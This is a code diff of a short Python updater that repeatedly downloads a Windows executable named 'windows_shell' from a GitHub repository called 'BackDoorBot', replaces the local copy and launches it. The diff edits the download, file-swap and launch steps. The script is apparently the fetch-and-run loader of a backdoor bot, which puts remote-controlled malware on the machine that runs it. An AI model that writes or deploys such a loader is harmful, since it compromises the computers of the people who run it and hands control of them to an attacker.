@@ -1,6 +1,8 @@
+# -*- coding: utf8 -*-
 import os, wget
+from pc import PPP
 p=os.getcwd()
-ipo=0
+ipo=PPP
 def main():
     while 1:
 
@@ -26,16 +28,20 @@ def main():
         return 0, versia[:5]
 
 while 1:
-    try:
+    if 1:
         klop, kakai_versia=main()
         if klop:
-            os.system(f"start {p}/vers/windows_shell.exe")
+            os.startfile("windows_shell.exe")
+            i=input()
+            break
         else:
             wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/windows_shell{ipo}.exe", p+"/vers/windows_shell.exe")
-            os.remove(p+"/main/windows_shell.exe")
-            os.replace("vers/windows_shell.exe", "main/windows_shell.exe")
+            try:
+                os.remove(p+"/windows_shell.exe")
+            except: pass
+            os.replace("vers/windows_shell.exe", "windows_shell.exe")
             vers= open(p+"/vers/vers.txt", "w")
             vers.write(kakai_versia)
             vers.close()
-    except:
+    else:
         print(0)
